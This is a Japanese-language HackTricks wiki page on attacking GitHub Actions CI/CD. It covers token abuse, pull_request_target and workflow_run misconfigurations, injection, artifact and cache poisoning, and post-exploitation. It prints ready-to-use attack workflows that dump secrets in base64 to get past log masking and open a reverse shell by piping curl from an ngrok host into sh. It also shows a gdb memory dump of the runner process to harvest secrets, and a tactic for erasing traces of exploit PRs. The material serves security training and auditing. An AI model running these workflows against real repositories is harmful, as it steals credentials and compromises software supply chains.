# Abusing Github Actions

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**をフォローする。**
* **PRを提出してハッキングトリックを共有する** [**HackTricks**](https://github.com/carlospolop/hacktricks) および [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubリポジトリ。

</details>
{% endhint %}

## Basic Information

このページでは以下の内容を見つけることができます：

* 攻撃者がGithub Actionにアクセスすることによる**すべての影響の概要**
* **アクションにアクセスする**ためのさまざまな方法：
* アクションを作成する**権限**を持つ
* **プルリクエスト**関連のトリガーを悪用する
* **他の外部アクセス**技術を悪用する
* すでに侵害されたリポジトリからの**ピボット**
* 最後に、内部からアクションを悪用するための**ポストエクスプロイト技術**に関するセクション（影響を引き起こす）

## Impacts Summary

[**Github Actionsの基本情報**](../basic-github-information.md#github-actions)についての紹介。

**任意のGithubアクションを実行/コードを注入**できる場合、**リポジトリ**で以下のことが可能になるかもしれません：

* そのリポジトリ/組織の**シークレット**を**盗む**。
* 注入のみが可能な場合、ワークフローに既に存在するものを盗むことができます。
* **リポジトリの権限**を悪用して、AWSやGCPなどの他のプラットフォームにアクセスする。
* **カスタムワーカーでコードを実行**（カスタムワーカーが使用されている場合）し、そこからピボットを試みる。
* リポジトリの**コードを上書き**する。
* これは`GITHUB_TOKEN`の権限（ある場合）に依存します。
* **デプロイ**やその他の**アーティファクト**を**侵害**する。
* コードが何かをデプロイまたは保存している場合、それを変更してさらにアクセスを得ることができます。

## GITHUB\_TOKEN

この「**シークレット**」（`${{ secrets.GITHUB_TOKEN }}`および`${{ github.token }}`から取得）は、管理者がこのオプションを有効にしたときに与えられます：

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

このトークンは**Githubアプリケーションが使用する**ものと同じであり、同じエンドポイントにアクセスできます：[https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Githubは、リポジトリが`GITHUB_TOKEN`を使用して他の内部リポジトリにアクセスできるようにする[**フロー**](https://github.com/github/roadmap/issues/74)をリリースするべきです。
{% endhint %}

このトークンの**権限**の可能性については、以下を参照してください：[https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

このトークンは**ジョブが完了した後に期限切れ**になることに注意してください。\
これらのトークンは次のようになります：`ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

このトークンでできる興味深いこと：

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% tab title="Approve PR" %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% tab title="Create PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
いくつかの場面で、**Github Actionsの環境やシークレットの中にgithubユーザートークンを見つけることができる**ことに注意してください。これらのトークンは、リポジトリや組織に対してより多くの権限を与える可能性があります。
{% endhint %}

<details>

<summary>Github Actionの出力でシークレットをリストする</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>secretsを使ってリバースシェルを取得する</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

他のユーザーのリポジトリでGithub Tokenに与えられた権限を**ログをチェック**することで確認することが可能です：

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## 許可された実行

{% hint style="info" %}
これはGithub Actionsを危険にさらす最も簡単な方法です。このケースでは、**組織内で新しいリポジトリを作成するアクセス権**を持っているか、**リポジトリに対する書き込み権限**を持っていることを前提としています。

このシナリオにいる場合は、[Post Exploitation techniques](./#post-exploitation-techniques-from-inside-an-action)を確認するだけです。
{% endhint %}

### リポジトリ作成からの実行

組織のメンバーが**新しいリポジトリを作成**でき、Github Actionsを実行できる場合、**新しいリポジトリを作成し、組織レベルで設定されたシークレットを盗む**ことができます。

### 新しいブランチからの実行

既にGithub Actionが設定されているリポジトリで**新しいブランチを作成**できる場合、そのアクションを**修正**し、**アップロード**してから**新しいブランチからそのアクションを実行**することができます。この方法で**リポジトリおよび組織レベルのシークレットを流出**させることができます（ただし、それらの名前を知っている必要があります）。

修正されたアクションを**手動で**、**PRが作成されたとき**、または**コードがプッシュされたとき**に実行可能にすることができます（どれだけ目立ちたくないかによります）：
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## フォークされた実行

{% hint style="info" %}
攻撃者が**他のリポジトリのGithub Actionを実行**することを可能にするさまざまなトリガーがあります。これらのトリガー可能なアクションが不適切に構成されている場合、攻撃者はそれらを侵害することができます。
{% endhint %}

### `pull_request`

ワークフロートリガー **`pull_request`** は、いくつかの例外を除いて、プルリクエストが受信されるたびにワークフローを実行します。デフォルトでは、**初めて**コラボレーションする場合、**メンテナー**がワークフローの**実行**を**承認**する必要があります：

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
**デフォルトの制限**は**初回**の貢献者に対するものであるため、**有効なバグ/タイプミスを修正**してから、**新しい`pull_request`権限を悪用する他のPRを送信**することができます。

**これをテストしましたが、うまくいきません**：~~別のオプションとして、プロジェクトに貢献してアカウントを削除した人の名前でアカウントを作成することも考えられます。~~
{% endhint %}

さらに、デフォルトでは、[**ドキュメント**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories)に記載されているように、ターゲットリポジトリへの**書き込み権限**と**シークレットアクセス**を防ぎます：

> `GITHUB_TOKEN`を除いて、**シークレットはフォークされたリポジトリからトリガーされたワークフローには渡されません**。プルリクエストでは、**`GITHUB_TOKEN`は読み取り専用権限**を持ちます。

攻撃者はGithub Actionの定義を変更して任意のことを実行し、任意のアクションを追加することができます。しかし、前述の制限のため、シークレットを盗んだりリポジトリを上書きしたりすることはできません。

{% hint style="danger" %}
**はい、攻撃者がPRでトリガーされるGithub Actionを変更すると、彼のGithub Actionが使用され、元のリポジトリのものではなくなります！**
{% endhint %}

攻撃者が実行されるコードも制御しているため、`GITHUB_TOKEN`にシークレットや書き込み権限がなくても、攻撃者は例えば**悪意のあるアーティファクトをアップロード**することができます。

### **`pull_request_target`**

ワークフロートリガー **`pull_request_target`** はターゲットリポジトリへの**書き込み権限**と**シークレットへのアクセス**を持ちます（許可を求めません）。

ワークフロートリガー **`pull_request_target`** は**ベースコンテキスト**で実行され、PRによって与えられるものではありません（**信頼できないコードを実行しないため**）。`pull_request_target`についての詳細は[**ドキュメント**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#pull\_request\_target)を参照してください。\
さらに、この特定の危険な使用についての詳細はこの[**githubブログ記事**](https://securitylab.github.com/research/github-actions-preventing-pwn-requests/)を参照してください。

**実行されるワークフロー**が**ベース**で定義されたものであり、**PRではない**ため、**`pull_request_target`**の使用は**安全**に見えるかもしれませんが、**いくつかのケースではそうではありません**。

そして、このトリガーは**シークレットへのアクセス**を持ちます。

### `workflow_run`

[**workflow\_run**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflow\_run)トリガーは、別のワークフローが`completed`、`requested`、または`in_progress`のときにワークフローを実行することを許可します。

この例では、別の「Run Tests」ワークフローが完了した後にワークフローが実行されるように構成されています：
```yaml
on:
workflow_run:
workflows: [Run Tests]
types:
- completed
```
さらに、ドキュメントによると: `workflow_run` イベントによって開始されたワークフローは、**前のワークフローがそうでなくても、シークレットや書き込みトークンにアクセスできる**。

この種のワークフローは、外部ユーザーが **`pull_request`** または **`pull_request_target`** を介してトリガーできる **ワークフロー** に **依存** している場合、攻撃される可能性があります。いくつかの脆弱な例は [**このブログ**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability) で見つけることができます。最初の例は、**`workflow_run`** によってトリガーされたワークフローが攻撃者のコードをダウンロードすることに関するものです: `${{ github.event.pull_request.head.sha }}`\
2つ目の例は、**信頼できない** コードから **アーティファクト** を **`workflow_run`** ワークフローに渡し、このアーティファクトの内容を使用して **RCE に対して脆弱** にする方法に関するものです。

### `workflow_call`

TODO

TODO: pull\_request から実行された場合に使用/ダウンロードされるコードがオリジナルのものかフォークされた PR のものかを確認する

## フォークされた実行の悪用

外部の攻撃者が GitHub ワークフローを実行させる方法についてはすべて言及しましたが、次に、この実行が悪く構成されている場合にどのように悪用されるかを見てみましょう:

### 信頼できないチェックアウトの実行

**`pull_request`** の場合、ワークフローは **PR のコンテキスト** で実行されます（したがって、**悪意のある PR のコード** が実行されます）が、誰かが **最初に承認する必要があり**、いくつかの [制限](./#pull\_request) があります。

**`pull_request_target` または `workflow_run`** を使用するワークフローの場合、**`pull_request_target` または `pull_request`** からトリガーできるワークフローに依存している場合、オリジナルのリポジトリのコードが実行されるため、**攻撃者は実行されるコードを制御できません**。

{% hint style="danger" %}
しかし、**アクション** が **明示的な PR チェックアウト** を持ち、**PR からコードを取得** する場合（ベースからではなく）、攻撃者が制御するコードが使用されます。例えば（PR コードがダウンロードされる 12 行目を確認してください）:
{% endhint %}

<pre class="language-yaml"><code class="lang-yaml"># INSECURE. Provided as an example only.
on:
pull_request_target

jobs:
build:
name: Build and test
runs-on: ubuntu-latest
steps:
<strong>    - uses: actions/checkout@v2
</strong><strong>      with:
</strong><strong>        ref: ${{ github.event.pull_request.head.sha }}
</strong>
- uses: actions/setup-node@v1
- run: |
npm install
npm build

- uses: completely/fakeaction@v2
with:
arg1: ${{ secrets.supersecret }}

- uses: fakerepo/comment-on-pr@v1
with:
message: |
Thank you!
</code></pre>

**信頼できないコードが `npm install` または `npm build` の間に実行されている可能性があります**。ビルドスクリプトと参照される **パッケージは PR の作成者によって制御されています**。

{% hint style="warning" %}
脆弱なアクションを検索するための GitHub dork は: `event.pull_request pull_request_target extension:yml` です。ただし、アクションが安全でないように構成されていても、ジョブを安全に実行するためのさまざまな方法があります（例えば、PR を生成するアクターに関する条件を使用するなど）。
{% endhint %}

### コンテキストスクリプトインジェクション <a href="#understanding-the-risk-of-script-injections" id="understanding-the-risk-of-script-injections"></a>

特定の [**GitHub コンテキスト**](https://docs.github.com/en/actions/reference/context-and-expression-syntax-for-github-actions#github-context) の値は、**PR を作成するユーザー** によって **制御** されることに注意してください。GitHub アクションがその **データを使用して何かを実行する** 場合、それは **任意のコード実行** につながる可能性があります:

{% content-ref url="gh-actions-context-script-injections.md" %}
[gh-actions-context-script-injections.md](gh-actions-context-script-injections.md)
{% endcontent-ref %}

### **GITHUB\_ENV スクリプトインジェクション** <a href="#what-is-usdgithub_env" id="what-is-usdgithub_env"></a>

ドキュメントから: 環境変数を定義または更新し、これを **`GITHUB_ENV`** 環境ファイルに書き込むことで、ワークフロージョブの後続のステップで環境変数を利用可能にすることができます。

攻撃者がこの **env** 変数に **任意の値を注入** できる場合、後続のステップでコードを実行できるような環境変数（**LD\_PRELOAD** や **NODE\_OPTIONS** など）を注入することができます。

例えば、[**この**](https://www.legitsecurity.com/blog/github-privilege-escalation-vulnerability-0) および [**この**](https://www.legitsecurity.com/blog/-how-we-found-another-github-action-environment-injection-vulnerability-in-a-google-project) ように、アップロードされたアーティファクトを信頼してその内容を **`GITHUB_ENV`** 環境変数に保存するワークフローを想像してください。攻撃者はこれをアップロードしてそれを危険にさらすことができます:

<figure><img src="../../../.gitbook/assets/image (261).png" alt=""><figcaption></figcaption></figure>

### 脆弱なサードパーティ GitHub アクション

#### [dawidd6/action-download-artifact](https://github.com/dawidd6/action-download-artifact)

[**このブログ記事**](https://www.legitsecurity.com/blog/github-actions-that-open-the-door-to-cicd-pipeline-attacks) で述べられているように、この GitHub アクションは異なるワークフローやリポジトリからアーティファクトにアクセスすることを許可します。

問題は、**`path`** パラメータが設定されていない場合、アーティファクトが現在のディレクトリに抽出され、後で使用または実行される可能性のあるファイルを上書きする可能性があることです。したがって、アーティファクトが脆弱である場合、攻撃者はこれを悪用してアーティファクトを信頼する他のワークフローを危険にさらすことができます。

脆弱なワークフローの例:
```yaml
on:
workflow_run:
workflows: ["some workflow"]
types:
- completed

jobs:
success:
runs-on: ubuntu-latest
steps:
- uses: actions/checkout@v2
- name: download artifact
uses: dawidd6/action-download-artifact
with:
workflow: ${{ github.event.workflow_run.workflow_id }}
name: artifact
- run: python ./script.py
with:
name: artifact
path: ./script.py
```
これは次のワークフローで攻撃できます:
```yaml
name: "some workflow"
on: pull_request

jobs:
upload:
runs-on: ubuntu-latest
steps:
- run: echo "print('exploited')" > ./script.py
- uses actions/upload-artifact@v2
with:
name: artifact
path: ./script.py
```
***

## その他の外部アクセス

### 削除されたNamespaceリポジトリのハイジャック

アカウントが名前を変更した場合、一定期間後に他のユーザーがその名前でアカウントを登録することができます。リポジトリが名前変更前に**100スター未満**であった場合、新しい登録ユーザーは削除されたリポジトリと**同じ名前のリポジトリ**を作成することがGithubによって許可されます。

{% hint style="danger" %}
したがって、アクションが存在しないアカウントのリポジトリを使用している場合でも、攻撃者がそのアカウントを作成してアクションを危険にさらす可能性があります。
{% endhint %}

他のリポジトリが**このユーザーのリポジトリからの依存関係**を使用している場合、攻撃者はそれらをハイジャックすることができます。より詳細な説明はこちらをご覧ください: [https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/](https://blog.nietaanraken.nl/posts/gitub-popular-repository-namespace-retirement-bypass/)

***

## リポジトリのピボット

{% hint style="info" %}
このセクションでは、最初のリポジトリに何らかのアクセスがあると仮定して、**一つのリポジトリから別のリポジトリにピボットする**ための技術について説明します（前のセクションを参照してください）。
{% endhint %}

### キャッシュポイズニング

キャッシュは**同じブランチでのワークフロー実行間**で維持されます。つまり、攻撃者が**パッケージ**を**危険にさらし**、それがキャッシュに保存され、**より高い権限を持つ**ワークフローによって**ダウンロード**および実行されると、そのワークフローも**危険にさらす**ことができます。

{% content-ref url="gh-actions-cache-poisoning.md" %}
[gh-actions-cache-poisoning.md](gh-actions-cache-poisoning.md)
{% endcontent-ref %}

### アーティファクトポイズニング

ワークフローは**他のワークフローやリポジトリからのアーティファクトを使用**することができます。攻撃者が**アーティファクトをアップロードするGithub Action**を**危険にさらし**、それが後で他のワークフローによって使用される場合、他のワークフローも**危険にさらす**ことができます。

{% content-ref url="gh-actions-artifact-poisoning.md" %}
[gh-actions-artifact-poisoning.md](gh-actions-artifact-poisoning.md)
{% endcontent-ref %}

***

## アクションからのポストエクスプロイト

### OIDCを介したAWSおよびGCPへのアクセス

以下のページを確認してください:

{% content-ref url="../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md" %}
[aws-federation-abuse.md](../../../pentesting-cloud/aws-security/aws-basic-information/aws-federation-abuse.md)
{% endcontent-ref %}

{% content-ref url="../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md" %}
[gcp-federation-abuse.md](../../../pentesting-cloud/gcp-security/gcp-basic-information/gcp-federation-abuse.md)
{% endcontent-ref %}

### シークレットへのアクセス <a href="#accessing-secrets" id="accessing-secrets"></a>

スクリプトにコンテンツを注入する場合、シークレットにアクセスする方法を知っておくと便利です:

* シークレットやトークンが**環境変数**に設定されている場合、**`printenv`**を使用して環境から直接アクセスできます。

<details>

<summary>Github Actionの出力でシークレットをリストする</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}

secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>シークレットを使ってリバースシェルを取得する</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

* シークレットが**直接式に使用されている場合**、生成されたシェルスクリプトは**ディスク上に保存**され、アクセス可能です。
* ```bash
cat /home/runner/work/_temp/*
```
* JavaScriptアクションの場合、シークレットは環境変数を通じて送信されます
* ```bash
ps axe | grep node
```
* **カスタムアクション**の場合、プログラムが**引数**から取得したシークレットをどのように使用するかによってリスクが異なる可能性があります:

```yaml
uses: fakeaction/publish@v3
with:
key: ${{ secrets.PUBLISH_KEY }}
```

### Self-hostedランナーの悪用

**Github Actionsが非Githubインフラストラクチャで実行されているかどうか**を見つける方法は、Github Action構成yamlで**`runs-on: self-hosted`**を検索することです。

**Self-hosted**ランナーは、**追加の機密情報**、他の**ネットワークシステム**（ネットワーク内の脆弱なエンドポイント？メタデータサービス？）へのアクセスを持っている可能性があり、隔離され破壊されても、**複数のアクションが同時に実行される可能性**があり、悪意のあるアクションが他のアクションの**シークレットを盗む**可能性があります。

Self-hostedランナーでは、\_Runner.Listener\_\*\*プロセス\*\*からシークレットを取得することも可能で、任意のステップでワークフローのすべてのシークレットをメモリダンプによって含むことができます:

{% code overflow="wrap" %}
```bash
sudo apt-get install -y gdb
sudo gcore -o k.dump "$(ps ax | grep 'Runner.Listener' | head -n 1 | awk '{ print $1 }')"
```
{% endcode %}

[**詳細はこちらの投稿をご覧ください**](https://karimrahal.com/2023/01/05/github-actions-leaking-secrets/).

### Github Docker Images Registry

Github actionsを使用して、**DockerイメージをビルドしてGithub内に保存する**ことが可能です。\
以下の展開可能な例をご覧ください:

<details>

<summary>Github Action Build &#x26; Push Docker Image</summary>
```yaml
[...]

- name: Set up Docker Buildx
uses: docker/setup-buildx-action@v1

- name: Login to GitHub Container Registry
uses: docker/login-action@v1
with:
registry: ghcr.io
username: ${{ github.repository_owner }}
password: ${{ secrets.ACTIONS_TOKEN }}

- name: Add Github Token to Dockerfile to be able to download code
run: |
sed -i -e 's/TOKEN=##VALUE##/TOKEN=${{ secrets.ACTIONS_TOKEN }}/g' Dockerfile

- name: Build and push
uses: docker/build-push-action@v2
with:
context: .
push: true
tags: |
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:latest
ghcr.io/${{ github.repository_owner }}/${{ github.event.repository.name }}:${{ env.GITHUB_NEWXREF }}-${{ github.sha }}

[...]
```
</details>

前述のコードでわかるように、Githubレジストリは**`ghcr.io`**にホストされています。

リポジトリに対して読み取り権限を持つユーザーは、パーソナルアクセストークンを使用してDockerイメージをダウンロードすることができます:
```bash
echo $gh_token | docker login ghcr.io -u <username> --password-stdin
docker pull ghcr.io/<org-name>/<repo_name>:<tag>
```
次に、ユーザーは**Dockerイメージレイヤー内の漏洩したシークレットを検索**できます:

{% embed url="https://book.hacktricks.xyz/generic-methodologies-and-resources/basic-forensic-methodology/docker-forensics" %}

### Github Actionsログ内の機密情報

**Github**はアクションログ内の**シークレット値を検出**し、**表示を避ける**ようにしていますが、アクションの実行中に生成された**他の機密データ**は隠されません。例えば、シークレット値で署名されたJWTは、[特定の設定](https://github.com/actions/toolkit/tree/main/packages/core#setting-a-secret)をしない限り隠されません。

## 証拠隠滅

（[**こちら**](https://divyanshu-mehta.gitbook.io/researchs/hijacking-cloud-ci-cd-systems-for-fun-and-profit)からのテクニック）まず、提出されたPRはGithubおよびターゲットのGitHubアカウントで公に見える状態です。デフォルトでは、**インターネットからPRを削除することはできません**が、裏技があります。Githubによって**アカウントが停止**された場合、そのアカウントの**PRは自動的に削除**され、インターネットからも削除されます。したがって、活動を隠すためには、**GitHubアカウントを停止させるか、アカウントをフラグ付け**する必要があります。これにより、GitHub上のすべての活動がインターネットから隠されます（基本的にすべてのエクスプロイトPRが削除されます）。

GitHubの組織はアカウントを報告するのに非常に積極的です。Issueに「いくつかのもの」を共有するだけで、12時間以内にアカウントが停止され、エクスプロイトがGitHub上で見えなくなります。

{% hint style="warning" %}
組織がターゲットにされたことを確認する唯一の方法は、GitHub UIからPRが削除されるため、SIEMからGitHubログを確認することです。
{% endhint %}

## ツール

以下のツールは、Github Actionワークフローを見つけたり、脆弱なものを見つけたりするのに役立ちます:

* [https://github.com/CycodeLabs/raven](https://github.com/CycodeLabs/raven)
* [https://github.com/carlospolop/PurplePanda](https://github.com/carlospolop/PurplePanda)

{% hint style="success" %}
AWSハッキングを学び、練習する:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCPハッキングを学び、練習する: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksをサポートする</summary>

* [**サブスクリプションプラン**](https://github.com/sponsors/carlospolop)をチェック！
* 💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**Telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)をフォローしてください。
* **PRを提出してハッキングトリックを共有する** [**HackTricks**](https://github.com/carlospolop/hacktricks)および[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリ。

</details>
{% endhint %}
